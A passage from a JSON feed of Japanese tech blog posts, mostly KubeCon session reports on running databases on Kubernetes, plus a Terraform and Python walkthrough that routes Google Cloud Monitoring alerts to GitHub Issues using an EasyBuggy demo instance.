Applications」の内容をまとめたもので、DatabaseのDevOpsとステートフルアプリケーションの継続的デリバリについてです。データベースCDの課題と解決策セッションでは、データパイプラインのデータテストをデリバリパイプラインに統合することの重要性が強調されていました。従来、データベースのテストは、BIツールなどを用いたカスタマイズされた方法で行われることが多かったようですが、最も信頼性の高いテスト方法は、新旧バージョンで同じデータに対してテストを実行することだとスピーカーは主張していました。そして、Kubernetesはこのようなテストを大幅に簡略化できるとのことでした。この主張は、データベースの変更がアプリケーション全体に及ぼす影響を正確に把握し、本番環境へのデプロイ前に潜在的な問題を早期に発見するために非常に重要です。Kubernetesによるデータベース運用の進化セッションで紹介されたアーキテクチャの進化は、Kubernetesがデータベース運用にもたらす利点を明確に示していました。初期のアーキテクチャでは、アプリケーション、データベース、インフラストラクチャの変更が個別に管理されていましたが、発展したアーキテクチャでは、これらが統合されたCI/CDパイプラインで管理されています。この統合により、アプリケーション、データベース、インフラストラクチャの変更をE2Eでテストできるようになり、本番環境へのデプロイリスクを大幅に軽減できます。このアーキテクチャの進化は、マイクロサービスアーキテクチャやクラウドネイティブ開発との親和性が高いと言えます。マイクロサービスでは、個々のサービスが独立してデプロイされるため、データベースの変更が他のサービスに及ぼす影響を正確に把握することが重要です。Kubernetesはこのような複雑な依存関係を管理し、安全なデプロイを実現するための強力なプラットフォームを提供します。デモのオーバービューセッションでは、具体的なスキーママイグレーションのシナリオを例に、ダウンタイムゼロでのデータベース変更を実現する方法が紹介されていました。WarehouseテーブルのLocationカラムの衝突問題を解決するために、CityとStateカラムを追加し、Locationカラムとの同期をトリガーで実現する方法は、実務で非常に役立つアプローチです。この手法は、データベースの変更によるアプリケーションへの影響を最小限に抑え、ユーザー体験を損なうことなくシステムを進化させることを可能にします。デモで利用されるCDパイプラインデモで適用されるデータベースへの変更個人的にはこのようなユースケースのテストシナリオは複雑になることが多いと考えていたため、自動化を行うには相当のカスタマイズが必要になると思っていたので、この後のデモの手軽さには非常に驚かされました。デモのハイライトとHarnessの活用youtu.beこのセッションはデモが全体のほとんどを閉めています。デモ開始時点のリンクがブログ記事の中盤にあるので、デモ部分だけでもご覧になることを強く推奨します。セッションのデモでは、Harnessというツールが使用され、変更プロセスとロールバック手順が分かりやすく可視化されていました。Harnessは、GitLab CI/CDやGitHub ActionsのようなUIを提供し、各ステップの成功/失敗を容易に確認できる点が優れていると感じました。特に、ArgoCDとの連携によるデータベースとアプリケーションの協調動作は、複雑なデプロイプロセスを簡素化する上で非常に効果的です。デモで紹介された、望ましい状態になっていないことを確認し、変更を加えるプロセスは、実践的な知見を提供していました。また、データベースの変更セットの一部として事前にロールバック手順を定義しておくことは、本番環境での予期せぬ問題発生時に迅速な対応を可能にするベストプラクティスと言えるでしょう。LiquibaseやFlywayなどのツールはこのような機能を提供しており、データベースDevOpsの実践において不可欠です。HarnessではデータベースのDevOpsをアプリケーション、インフラストラクチャー込みで実現しており、非常に理想的なツールのように見えました。一方でこのセッションのスピーカーのひとりはHarnes.ioのエンジニアであるため、ポジショントークや見せたい部分しか見せていないことが十分考えられるので全てを鵜呑みにするのは危険です。それを差し引いても興味深いデモだったので、セッションで紹介された技術スタックを検証してみたいと思っています。まとめこのセッションは、Kubernetesとツールを活用することで、データベースの変更を安全かつ効率的に行う方法を示していました。E2Eテスト、ダウンタイムゼロのスキーママイグレーション、そしてロールバック手順の自動化は、データベースDevOpsを実現するための重要な要素です。これらの手法を適切に組み合わせることで、開発速度を向上させながら、システムの安定性と信頼性を維持することが可能になります。しかし、ここで紹介された手法は全ての状況に適用できるわけではありません。例えば、大規模なデータベースや複雑なトランザクション処理を行うシステムでは、ダウンタイムゼロのマイグレーションが困難な場合があります。そのようなケースでは、段階的なロールアウトやカナリアリリースなどの手法を検討する必要があります. また、ツールの導入や運用にはコストがかかるため、組織の規模やリソースに合わせて適切なツールを選択することが重要です。今後のデータベース運用においては、自動化と可観測性をさらに強化し、自己修復機能を備えた自律的なデータベース運用を目指していくことが重要だと考えます。Kubernetesやクラウドネイティブ技術は、この目標を実現するための基盤となるでしょう。またこのセッションを見るまで、個人的にDatabase on KubernetesはKubernetesを利用している組織でマネージドデータベースのコストを安くしたい場合や、データを自分たちのコントロールできる場所におきたい時に利用する選択肢と思っていました。しかしデータベースをKubenetesにデプロイすることでアプリケーションと密接に結合したテストを簡単に行えることがわかり、データベースの運用コストさえ許容できれば、他のメリットがなくてもデータベースをKubernetesで運用するのは十分ありなのではないかと意見が変わりました。今後は単なるデータベースのホスティング環境としてのKubernetes以外の部分にも注目していきたいです。","isoDate":"2024-12-14T18:55:02.000Z","dateMiliSeconds":1734202502000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Cloud Deploy で Cloud Run functions に継続的デリバリーする","link":"https://zenn.dev/kimitsu/articles/cloud-deploy-cloud-run-functions","contentSnippet":"Cloud Deploy は継続的デリバリーを行うための Google Cloud のフルマネージドサービスです。標準では Google Kubernetes Engine と Cloud Run (service と job) へのデプロイをサポートしていますが、カスタムターゲットを定義することでそれ以外の対象にもデプロイすることができます。今回はカスタムターゲットを利用して Cloud Run functions へのデプロイを自動化してみます。本記事では Cloud Deploy の基本的な概念（ターゲット、リリース、デプロイパイプラインなど）については説明しません。これら...","isoDate":"2024-12-14T01:17:49.000Z","dateMiliSeconds":1734139069000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"KubeCon NA 2024: Building Resilience: Effective Backup and Disaster Recovery for Vector Databases on Kubernetes のセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/13/building_resilienc_effective_backup_and_disaster_recovery_for_database_on_lubernetes","contentSnippet":"この記事は以下アドベントカレンダー13日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ2Building Resilience: Effective Backup and Disaster Recovery for Vector Databases on Kubernetes セッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7kn/when-life-gives-you-containers-make-an-open-source-rds-a-kubernetes-love-story-sergey-pronin-perconawww.youtube.comKubeCon + CloudNativeCon North America 2024 のセッション \\"Building Resilience: Effective Backup and Disaster Recovery for Vector Databases on Kubernetes\\" は、AI アプリケーションにおけるベクトルデータベースの重要性と、Kubernetes 上での堅牢なデータ保護戦略の必要性を強調した示唆に富む内容でした。マーケティング的な観点や、聴衆の興味を引くためといった理由からかタイトルでベクトルデータベースとなっていますが、バックアップの部分ではあらゆるデータベースやステートフルワークロードに応用ができる内容でした。AI and Kubernetesセッションは、AI がアプリケーションにもたらす変革的な影響についての概説から始まりました。リソース需要予測による動的スケーリング、異常検知によるセキュリティ向上、UX の改善、そして事前の障害予測による可用性向上など、AI はアプリケーションのあらゆる側面を最適化する可能性を秘めています。そして、これらのメリットを実現する上で、Kubernetes が最適なプラットフォームとして位置づけられています。迅速なデプロイ、高可用性とスケーラビリティ、可搬性と柔軟性、分散ワークロード管理の効率化、そして効率的なバックアップとリカバリといった Kubernetes の特徴は、AI ワークロードの運用に不可欠な要素です。特に、データベースを Kubernetes 上で運用する組織が増加しているという Data on Kubernetes のレポートの言及は、AI/ML ワークロードとデータベース運用の密接な関係性を示唆しており、データベースエンジニアとして注目すべき点でした。Kubernetes がステートフルなアプリケーションの運用基盤として成熟しつつあることを改めて認識させられました。Kubernetes上でAIアプリケーションをデプロイする理由セッションでは、Kubernetes上でAIアプリケーションをデプロイする理由として、迅速なデプロイ、高可用性とスケーラビリティ、可搬性と柔軟性、分散ワークロードの管理の効率化、効率的なバックアップとリカバリ、そしてエコシステムとコミュニティの発展が挙げられていました。これらの利点は、クラウドネイティブな開発と運用を目指す上で非常に重要です。特に、マイクロサービスアーキテクチャを採用する際に、Kubernetes はサービスのデプロイと管理を簡素化し、スケーラビリティと可用性を向上させる上で強力なツールとなります。さらに、ベクトルデータベースのようなステートフルなサービスを Kubernetes 上で運用することで、データの永続性と可用性を確保し、AI アプリケーションの信頼性を向上させることができます。Vector Databases and RAGセッションの中核を成すのが、ベクトルデータベースと RAG (Retrieval Augmented Generation) の解説です。非構造化データの増加に伴い、従来のデータベースでは対応が難しくなってきた画像、テキスト、音声といったデータの効率的な処理が求められています。ベクトルデータベースは、これらの非構造化データをベクトル表現に変換し、類似度検索によって関連性の高い情報を高速に取得することを可能にします。Embedding Model を用いたベクトル化によって、意味的な検索が可能になり、AI アプリケーションの精度と効率性が向上する点が強調されていました。特に、生成 AI アプリケーションにおけるハルシネーション軽減とコンテキスト付与におけるベクトルデータベースの役割は重要です。RAG は、ベクトルデータベースを用いて関連情報を取得し、生成 AI の出力に信頼性を与える手法として紹介されており、今後の AI アプリケーション開発において不可欠な要素となるでしょう。ベクトルデータベースのユースケースセッションでは、ベクトルデータベースのユースケースとして、検索エンジン、画像検索、推薦アルゴリズム、異常検知、そしてチャットボットなどの生成 AI アプリケーションが挙げられていました。これらのユースケースは、現代のアプリケーション開発において非常に重要であり、ベクトルデータベースの適用範囲の広さを示しています。特に、マイクロサービスアーキテクチャにおいて、ベクトルデータベースを独立したサービスとして提供することで、様々なサービスから容易にアクセスできるようになり、システム全体の柔軟性と拡張性を向上させることができます。また、DevOps/SRE の実践においては、ベクトルデータベースの監視と運用を自動化することで、システムの信頼性と可用性を向上させることができます。Data Protectionデータ保護は、Kubernetes 上で運用されるベクトルデータベースにとって不可欠な要素です。データの整合性とセキュリティ、災害復旧、コストと時間の効率化、バージョンコントロール、そしてコンプライアンス規制への準拠など、データ保護は多岐にわたるメリットを提供します。セッションでは、Kubernetes 上でのベクトルデータベースのデータ保護方法として、ストレージスナップショット、データサービスを利用したストレージスナップショット、データサービスレベルのスナップショット、そしてこれらの組み合わせが紹介されました。PVC を利用した永続化データの保護は、Kubernetes ネイティブなデータ保護戦略を構築する上で重要なポイントです。Kanister のようなデータ保護ワークフロー管理ツールは、バックアップとリストアの手順を抽象化し、自動化することで、運用効率を大幅に向上させることができます。Kanister の Blueprint、Profile、ActionSet といった CRD を活用することで、柔軟なデータ保護ワークフローを定義し、Kubernetes の宣言的な運用を実現できます。Kanisterの動作Kanister の動作は、ActionSet が Controller に動作を開始するようにトリガーし、Controller が Blueprint を参照して定義されたオペレーションに従ってベクトルデータベースからバックアップを取得し、オブジェクトストレージに保存するという流れで実行されます。動作完了後、Controller は ActionSet に完了を伝え、ActionSet がユーザーに完了を通知します。この自動化されたワークフローは、データベースエンジニアの運用負荷を軽減し、ヒューマンエラーのリスクを最小限に抑える上で非常に有効です。また、バックアップとリストアのプロセスをコード化することで、再現性と信頼性を向上させることができます。Demoデモでは、書籍推薦チャットボット BookNest を例に、PostgreSQL と PGVector を利用したベクトルデータベースのバックアップとリストアのワークフローが紹介されました。提供された図とデモ動画は、Kanister を用いたデータ保護の実践的な方法を理解する上で非常に役立ちました。具体的な構成例を示すことで、視聴者は自身の環境に合わせたデータ保護戦略を検討する際の参考にすることができます。また、デモを通じて Kanister の操作方法やワークフローの定義方法を視覚的に理解することができ、実践的な知識を深めることができます。Kanister の Blueprint は Kubernetes の manifest 内で ShellScript を書くようなイメージでかけるため、すでに Kubernetesを利用している組織であれば利用に大きなハードルは少なそうだと感じました。Operator 化されたデータベースでは大きなメリットはないかもしれないですが、そうでないデータベースのバックアップや、Operator を使っていても複数の種類がある場合オペレーションの使用ツールの共通化という面で十分メリットがあるでしょう。Call to Actionセッションの締めくくりとして、AI アプリケーションとベクトルデータベースの重要性、そしてデータ保護の必要性が改めて強調されました。データ保護を Day 0 Operation と位置づけるというメッセージは、システム設計の初期段階からデータ保護を考慮することの重要性を示唆しています。システムの保守性、スケーラビリティ、セキュリティを確保する上で、データ保護は不可欠な要素であり、アプリケーション開発ライフサイクル全体を通じて考慮する必要があります。まとめこのセッションは、AI アプリケーションにおけるベクトルデータベースの重要性と、Kubernetes 上での堅牢なデータ保護戦略の構築方法について、具体的な例を交えながら分かりやすく解説していました。特に、Kanister のようなデータ保護ツールを活用することで、複雑なバックアップとリカバリのワークフローを簡素化し、自動化できる点が印象的でした。データベースを Kubernetes 上で運用する際には、データ保護を Day 0 Operation として捉え、Kanister のようなツールを活用することで、システムの信頼性と可用性を向上させることができます. セッションで提示された情報は、今後のデータベース運用戦略を検討する上で非常に貴重な示唆を与えてくれました。このセッションで扱われなかった点として、ベクトルデータベースの選択基準やパフォーマンスチューニング、そして異なるベクトルデータベースにおけるデータ保護戦略の差異などが挙げられます。今後のセッションでは、これらの点についても掘り下げて議論されることを期待します。","isoDate":"2024-12-13T08:57:05.000Z","dateMiliSeconds":1734080225000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"ｻｯとかざして即起動! 推しグッズを神曲再生アイテムに(*\xb0∀\xb0)","link":"https://zenn.dev/nedoko_dok0dko/articles/9db9d10902ec03","contentSnippet":"※3-shake Advent Calendar 2024の13日目のエントリー記事です。本日、12月13日は金曜日。世の中では「ジェイソンの日」なんて言われています。とはいえ、生まれてこの方ジェイソンの映画を見ることがなかったためこの手の話についてはかなり縁遠い気がしていします。(JSONの方先に連想しちゃいますし)むしろ「華金だーー＼(^o^)／」くらいしか考えていません。それしかありません。そんな社会人です。さて、今年もやってまいりましたアドベントカレンダー。2024年も引き続き参加させていただく運びとなりました。テーマは前回同様「技術・非技術関係なし!自由!」ということ...","isoDate":"2024-12-12T15:00:01.000Z","dateMiliSeconds":1734015601000,"authorName":"seno","authorId":"seno"},{"title":"GolangからPagerdutyのインシデントを発砲する","link":"https://zenn.dev/tayusa/articles/9091399d6a9018","contentSnippet":"目的Golangで作成したアプリケーションからPagerdutyの任意のインシデントを発砲する Event API v2https://developer.pagerduty.com/docs/3d063fd4814a6-events-api-v2-overview高信頼性、高可用性の非同期APIでシステムからマシンイベントを取り込みます。このAPIに送られたイベントは最終的にPagerDutyサービスにルーティングされ処理されます Event Types Alert監視システムの問題。 既存のアラートを確認または解決するためにイベントを送信することができる...","isoDate":"2024-12-11T13:30:34.000Z","dateMiliSeconds":1733923834000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Google Cloud monitoringのアラートをGitHub Issueに通知する","link":"https://kechigon.hatenablog.com/entry/2024/12/11/182649","contentSnippet":"タイトルの通り、Google Cloud monitoringのアラートをGitHub Issueに通知するシステムの構築方法を紹介します。terrafromを使って作成します。コードはGitHubリポジトリにまとまっています。github.comこのコードをapplyすることで、Webサービス(EasyBuggy)、監視、アラートをIssueに持っていくパイプラインがデプロイされます。システム図このような構成をとっています。main.tf早速コードを紹介していきます。このファイルでは、EasyBuggyという脆弱なWebサービスをGCEにデプロイします。terraform {  required_providers {    google = {        source = \\"hashicorp/google\\"        version = \\"5.39.0\\"    }  }}provider \\"google\\" {  credentials = var.credential_file  project     = var.project  region      = var.region}resource \\"google_compute_instance\\" \\"easybuggy\\" {  name         = \\"easybuggy-instance\\"  machine_type = \\"n1-standard-1\\"  zone         = var.zone  boot_disk {    initialize_params {      image = \\"debian-cloud/debian-11\\"    }  }  network_interface {    network = \\"default\\"        access_config {}  }  metadata = {    \\"enable-osconfig\\" = \\"true\\"  }     metadata_startup_script = <<EOF#!/bin/bashsudo apt-get updatefor pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do sudo apt-get remove $pkg; donesudo apt-get install -y ca-certificates curl git sudo install -m 0755 -d /etc/apt/keyringssudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.ascsudo chmod a+r /etc/apt/keyrings/docker.ascecho \\\\  \\"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \\\\  $(. /etc/os-release && echo \\"$VERSION_CODENAME\\") stable\\" | \\\\sudo tee /etc/apt/sources.list.d/docker.list > /dev/nullsudo apt-get updatesudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-pluginsudo git clone https://github.com/k-tamura/easybuggy.gitcd easybuggysudo docker build . -t easybuggy:local sudo docker run -p 8080:8080 easybuggy:local EOF}resource \\"google_compute_firewall\\" \\"allow-home-ip\\" {  name    = \\"allow-home-ip\\"  network = \\"default\\"   allow {    protocol = \\"tcp\\"    ports    = [\\"8080\\"]  }  source_ranges = [var.my_ip]}output \\"instance_ip\\" {  value = google_compute_instance.easybuggy.network_interface[0].access_config[0].nat_ip}monitoring.tfこちらのファイルでは監視、アラートをIssueに持っていくパイプラインをデプロイします。main.tfでデプロイしたインスタンスのCPU使用率が80%を超えるとアラートが発生します。resource \\"google_pubsub_topic\\" \\"alerts_topic\\" {  name = \\"alerts-topic\\"}resource \\"google_pubsub_subscription\\" \\"alerts_subscription\\" {  name  = \\"alerts-subscription\\"  topic = google_pubsub_topic.alerts_topic.name}resource \\"google_monitoring_notification_channel\\" \\"pubsub_channel\\" {  display_name = \\"Pub/Sub to Cloud Function\\"  type         = \\"pubsub\\"  labels = {    \\"topic\\" = google_pubsub_topic.alerts_topic.id  }}resource \\"google_pubsub_topic_iam_binding\\" \\"alerts_topic_publisher\\" {  topic = google_pubsub_topic.alerts_topic.name  role    = \\"roles/pubsub.publisher\\"  members = [    \\"serviceAccount:service-${var.project_id}@gcp-sa-monitoring-notification.iam.gserviceaccount.com\\"  ]}resource \\"google_storage_bucket\\" \\"easybuggy_monitoring_function_bucket\\" {  name          = \\"easybubby_monitoring-functions-bucket\\"  location      = \\"ASIA-NORTHEAST1\\"  force_destroy = true}resource \\"google_storage_bucket_object\\" \\"function_source_object\\" {  name   = \\"function-source.zip\\"  bucket = google_storage_bucket.easybuggy_monitoring_function_bucket.name  source = \\"function-source.zip\\"}resource \\"google_cloudfunctions_function\\" \\"issue_creator_function\\" {  name        = \\"issue-creator-function\\"  description = \\"Receive Pub/Sub message from Google Cloud Monitoring and create a GitHub issue\\"  runtime    = \\"python39\\"  source_archive_bucket = google_storage_bucket.easybuggy_monitoring_function_bucket.name  source_archive_object = google_storage_bucket_object.function_source_object.name  entry_point           = \\"main\\"  region                = var.region  environment_variables = {    \\"GITHUB_API_TOKEN\\" = var.github_api_token    \\"GITHUB_REPO\\"      = var.github_repo    \\"GITHUB_OWNER\\"     = var.github_owner  }  event_trigger {    event_type = \\"providers/cloud.pubsub/eventTypes/topic.publish\\"    resource   = google_pubsub_topic.alerts_topic.id  }}resource \\"google_monitoring_alert_policy\\" \\"cpu_usage_policy\\" {  display_name = \\"High CPU Utilization Alert\\"  combiner     = \\"OR\\"  conditions {    display_name  = \\"CPU usage over 80%\\"    condition_threshold {      filter          = \\"metric.type=\\\\\\"compute.googleapis.com/instance/cpu/utilization\\\\\\" AND resource.type=\\\\\\"gce_instance\\\\\\"\\"      duration        = \\"60s\\"      comparison      = \\"COMPARISON_GT\\"      threshold_value = 0.8      }  }  enabled = true  notification_channels = [google_monitoring_notification_channel.pubsub_channel.id]}main.pyfunctionsで実行されるコードです。pub/subから受け取ったデータからアラートのtitleとbodyを抜き出してGithub Issueにポストします。import base64import jsonimport osimport loggingimport requestsfrom flask import Flask, requestapp = Flask(__name__)GITHUB_API_TOKEN = os.environ.get(\'GITHUB_API_TOKEN\')GITHUB_REPO = os.environ.get(\'GITHUB_REPO\')GITHUB_OWNER = os.environ.get(\'GITHUB_OWNER\')logging.basicConfig(level=logging.INFO)logger = logging.getLogger(__name__)def create_github_issue(data):    issue_title = f\\"Alert: {data[\'incident\'][\'incident_id\']}\\"    issue_body = data[\'incident\'][\'summary\']    logger.info(f\\"Creating issue with title: {issue_title} body: {issue_body}\\")    response = requests.post(        f\\"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/issues\\",        headers={            \\"Authorization\\": f\\"token {GITHUB_API_TOKEN}\\",            \\"Accept\\": \\"application/vnd.github.v3+json\\",        },        json={            \\"title\\": issue_title,            \\"body\\": issue_body,        },    )    if response.status_code == 201:        logger.info(\\"Issue created successfully\\")        return \\"Issue created successfully\\", 201    else:        logger.error(f\\"Failed to create issue: {response.content}\\")        return f\\"Failed to create issue: {response.content}\\", response.status_code@app.route(\'/\', methods=[\'POST\'])def main(d, context): #Need to receive arguments    envelope = request.get_json()        if not envelope:        logger.error(\\"No envelope received\\")        return \\"Bad Request\\", 400        logger.info(f\\"envelope: {envelope}\\")    pubsub_data = envelope.get(\'data\', {})    logger.info(f\\"pub_sub_data\\")    if not pubsub_data:        logger.error(f\\"No outside data received: \\")        return \\"Bad Request\\", 400    try:        data_base64 = pubsub_data.get(\'data\', \'\')        if not data_base64:            raise ValueError(\\"No data field in outside data\\")                data = base64.b64decode(data_base64.encode(\'utf-8\')).decode(\'utf-8\')        logger.info(f\\"Decoded data: {data}\\")        data = json.loads(data)                logger.info(f\\"Received data: {data}\\")    except Exception as e:        logger.error(f\\"Error processing message: {e}\\")        return \\"Bad Request\\", 400        return create_github_issue(data)if __name__ == \\"__main__\\":    app.run()デプロイ内容を理解したらterraform applyしましょう。アプライが成功したらインスタンスIPが表示されます。動作確認http://instance_ip:8080にブラウザでアクセスするとこのような画面になります。「無限ループ」のリンクを押し、無限ループを発生させましょう。CPU使用率が80%を超えたことを確認し、GitHub Issueを確認すると、アラートが通知されています。以上がGoogle Cloud monitoringのアラートをGitHub Issueに通知する流れとなります。","isoDate":"2024-12-11T09:26:49.000Z","dateMiliSeconds":1733909209000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"Kube-schedulerプラグインCoschedulingを体験してみた","link":"https://zenn.dev/k_nagase/articles/co_scheduling","contentSnippet":"本記事は 3-shake Advent Calendar 2024 シリーズ 1 の 11 日目の記事です。 はじめにここ最近Kubernetesのスケジューリングについて調査する機会があり、その一環でスケジューラープラグインの1つであるCoschedulingについても調査しました。この時の調査と簡単なハンズオンについてこの記事でまとめてみたいと思います。Kubernetesのコントロールプレーンの1コンポーネントであるスケジューラはpluginによる機能拡張が可能です。プラグインは以下のリポジトリにまとまっています。https://github.com/kubernetes...","isoDate":"2024-12-11T01:00:01.000Z","dateMiliSeconds":1733878801000,"authorName":"Kohei Nagase","authorId":"k-nagase"},{"title":"スリーシェイクインタビュー: 技術顧問 うたもくさん編","link":"https://sreake.com/blog/interview-utam0k/","contentSnippet":"こんにちは。スリーシェイクのSreake事業部所属の早川(@bells17)です。 今回は7月からスリーシェイクの技術顧問に就任してもらったうたもくさん(@utam0k)に対談形式でインタビューをさせていただきましたので […]The post スリーシェイクインタビュー: 技術顧問 うたもくさん編 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-10T04:16:19.000Z","dateMiliSeconds":1733804179000,"authorName":"Sreake","authorId":"Sreake"},{"title":"LookMLで値を変換したい？それならcaseはいかが?","link":"https://zenn.dev/nedoko_dok0dko/articles/c677f78d5ae2b0","contentSnippet":"はじめに※本投稿はLooker Advent Calendar 2024 の10日目の記事となりますはじめまして。偶然業務でLookerに出会い、そこから色々触っているデータエンジニアです。Lookerについてはまだまだ駆け出しの身ではありますが、少しずつ分かる事が増え、Lookerへの理解が深まってきたと感じています。今回はそんな初心者がLookerのフィールドパラメータであるcaseを触ってみた話です。 想定読者Lookerについて基本概要を知っているLookMLを知っているLookMLを触ったことがある・実装したことがある 背景・経緯※情報に関して...","isoDate":"2024-12-09T16:42:38.000Z","dateMiliSeconds":1733762558000,"authorName":"seno","authorId":"seno"},{"title":"「Cloud Run functions」にコンテナがデプロイできるの知ってる？","link":"https://zenn.dev/kimitsu/articles/deploy-container-to-cloud-run-functions","contentSnippet":"!本記事はネタ記事です！Cloud Run functions は Google Cloud の FaaS です。ユーザはコンテナ、ランタイム、Web サーバーを管理することなく、コードを書くだけでデプロイすることができます。本来はコンテナ化が不要な Cloud Run functions ですが、コンテナをデプロイできることをご存知でしょうか。 Cloud Run functions の仕組みユーザが Cloud Run functions にデプロイしたコードは複数の抽象化レイヤーの上で動きます。[1]一番内側にユーザが書いたコードがあり、その下にはまず Func...","isoDate":"2024-12-08T13:16:22.000Z","dateMiliSeconds":1733663782000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"【GitHub Actions】編集されたディレクトリに応じてラベルを付与する","link":"https://zenn.dev/kamos/articles/16def632754577","contentSnippet":"はじめに最近になってTerraformを触る機会が少し増えてきました。そのリポジトリはdevelopment, staging, productionのそれぞれのディレクトリがありました。.└── environments    ├── development    │   ├── main.tf    │   └── xxx.tf    ├── staging    │   ├── main.tf    │   └── xxx.tf    └── production        ├── main.tf        └── xxx.tfこの構成では環境...","isoDate":"2024-12-08T13:14:28.000Z","dateMiliSeconds":1733663668000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":" KubeCon NA 2024: The Future of DBaaS on Kubernetesのセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/08/kubecon_na_the_future_of_dbaas_ob_kubernetes","contentSnippet":"この記事は以下アドベントカレンダー8日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ2The Future of DBaaS on Kubernetesのセッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7kL/the-future-of-dbaas-on-kubernetes-melissa-logan-constantia-sergey-pronin-percona-deepthi-sigireddi-planetscale-gabriele-bartolini-edbセッション動画:https://www.youtube.com/watch?v=Z35SlsYd1ds「The Future of DBaaS on Kubernetes」は、Data on Kubernetes Communityのメンバーによるパネルディスカッション形式で、Kubernetes上で動作するDBaaSの将来について議論されました。ここ数年でデータベースをKubernetes上で動かすにあたりどう便利になったか？セッションでは、Kubernetesにおけるストレージとネットワーキングの進化が、データベース運用を大きく改善した点が強調されました。Volume Snapshotなどのストレージ関連機能の向上は、バックアップとリカバリといったDay 2 Operationを効率化し、Local Persistent Volumeの導入と改善は、データベースの高可用性とディザスタリカバリ構成をシンプルに実現可能にしました。また、Cilium Network PolicyやIngress/Egressといったネットワーキング機能は、マルチテナントサービスにおけるアクセス制御を容易にし、セキュリティ強化に貢献しています。これらの改善により、増加するデータベースと、優秀なデータベースエンジニア不足という課題に対し、Kubernetesは少ない人員でデータベースをスケールさせる有効な手段となっています。数年前に比べ、Kubernetes上でのデータベース運用はより現実的になり、エンタープライズグレードの運用にも耐えうるレベルに達しています。これは、Kubernetesがステートレスなアプリケーションだけでなく、ステートフルなデータベースにも適したプラットフォームへと進化したことを示しています。私がKubernetesを触り始めた時点ではここで紹介されているほとんどの機能はサポートされており、なぜKubernetesでデータベースを運用することが難しいのかを理解しきれない面がありました。このセクションによる直近のデータベース観点でのKubernetesのアップデートの紹介により、何が障壁でそれがどのように解決されたのかの理解が深まりました。Kubernetes上でデータベースを動かしている顧客についてシェアできる事例はあるか？セッションでは、Nokia、Broadcom、HubSpot、Shopify、IBMなど、様々な企業がKubernetes上でデータベースを運用している事例が紹介されました。これらの事例は、マイクロサービスアーキテクチャの普及と密接に関連しています。マイクロサービス化されたアプリケーションでは、単一のモノリシックなデータベースではなく、サービスごとにデータベースを持つ傾向があり、Kubernetesはそのような分散データベース環境の構築と管理を容易にします。特に、開発者がデータベースを所有し、インフラ管理者がDBaaSをインターフェイスとしてデータベースを払い出すという新しい運用モデルは、今後の主流となる可能性を示唆しています。これは、DevOpsの原則をデータベース運用に取り入れることで、開発速度と運用効率を向上させるアプローチと言えるでしょう。セクション内で紹介されている開発者がデータベースを所有し、インフラ管理者がデータベースを払い出すという体制はパブリッククラウドで運用されるマイクロサービスアーキテクチャでは当たり前のように実践されており、Kubernetesでも今後の主流となると考えることは不思議ではないでしょう。そしてそれは従来のVMやベアメタルベースのDBAがデータベース管理を行うには多すぎるデータベースが運用され、限界を迎えることは想像に難くなく、KubernetesとOperatorによる運用の簡略化は必須と言えるかもしれません。Kubernetes上でデータベースを動かすにあたりベストプラクティスはなにか？ベストプラクティスとして、クラウド中立性、クラウドレディネス、セルフサービス、セキュリティ、アーキテクチャ設計などが挙げられました。Operatorの活用は、クラウドベンダーに依存しない運用を実現する上で重要であり、UI/APIの整備やArgoCDなどのツールとの連携により、データベースのプロビジョニングと管理を自動化できます。また、開発者が容易にスケーリングやテスト環境構築を行えるセルフサービス環境も重要です。セキュリティについては、業界標準やコンプライアンス要件に合わせたポリシー設定が不可欠です。アーキテクチャ設計では、PostgreSQLを例に、Kubernetesの機能を活用した高可用性構成や、複数のアベイラビリティゾーンを考慮した設計が重要となります。さらに、Kubernetesの標準APIを活用することで、オブザーバビリティやセキュリティ、証明書の管理を簡素化し、他のコンポーネントとの統合を容易にすることが推奨されています。VMからの移行時には、ストレージを分離することでリソース管理の予測精度を高めることが重要です。ここではベストプラクティスとしてユーザーがセルフサービスでデータベースを立ち上げる方法としてGUIとAPIとツール連携による自動化二つの観点が出ていました。個人的にはパブリッククラウドとIaCの流れを見るにGUIベースよりAPIによる自動化が主流になっていくのではないかと考えます。またデータベースではないですがオンプレミスのVMベースシステムからKubernetesのコンテナベースに移行するプロジェクトに関わった時は独自のプロトコルによる通信をVMで実装しており、その方法をコンテナの世界に持ち込もうとした結果非常に複雑になっていた事例を見たことがあります。そのため、ここで紹介されているKubernetesとそのエコシステムに合わせることは不可欠ではないかと感じます。データベースをKubenetesで動かす場合の課題や落とし穴はあるか？セッションでは、VM環境での運用とKubernetes環境での運用を混同してしまうこと、マイグレーション計画の不足、リソースの過剰確保、そして人材育成の課題が議論されました。既存のVM向けスクリプトをそのままKubernetesに適用しようとするのではなく、クラウドネイティブな考え方を取り入れ、スケーラビリティと信頼性の向上に焦点を当てるべきです。マイグレーションにおいては、全てのワークロードの移行と、ダウンタイム最小化を両立するための綿密な計画が必要です。リソース管理においては、Kubernetesの柔軟性を活かし、適切なリソース割り当てを行うための実験と調整が重要です。さらに、DBAがKubernetesの基礎知識を習得し、データベース運用における新たなパラダイムシフトに対応できるよう、人材育成に力を入れる必要があります。このセッションを通して一番に感じたのはオンプレからパブリッククラウドへの移行と気にするところは同じだということと、DBAとKubernetesの距離を近づけることはやはり大事だということでした。特にDBAとKubernetesについてはより簡単なソリューションとして存在してし